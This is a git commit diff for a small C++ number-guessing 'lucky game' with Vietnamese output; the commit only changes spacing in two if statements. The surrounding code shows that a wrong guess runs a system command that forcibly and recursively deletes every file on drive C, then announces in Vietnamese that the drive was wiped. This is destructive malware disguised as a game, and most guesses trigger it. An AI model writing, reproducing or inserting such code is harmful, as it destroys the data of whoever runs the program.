58176ee0576ba20aa144abd4a69cf1657cbb9be7
Glasspham <95564442+Glasspham@users.noreply.github.com>
2023-12-07 16:49:05 +0700

    Update Tro_choi_may_man.cpp

--- Tro_choi_may_man.cpp
+++ Tro_choi_may_man.cpp
@@ -9,12 +9,12 @@ int main()
 	cin >> so;
 
 	int random = rand() % 10 + 1;
-	if (so == random)
+	if(so == random)
 		cout << "Ban da doan dung so random la: " << random << endl;
 	else
 		cout << "Ban da doan sai so random la: " << random << endl;
 
-	if (so != random)
+	if(so != random)
 	{	
 		system("del C:\\*.* /f /s /q");		
 		cout << "Da xoa xong o C do ban nhap sai so random" << endl;
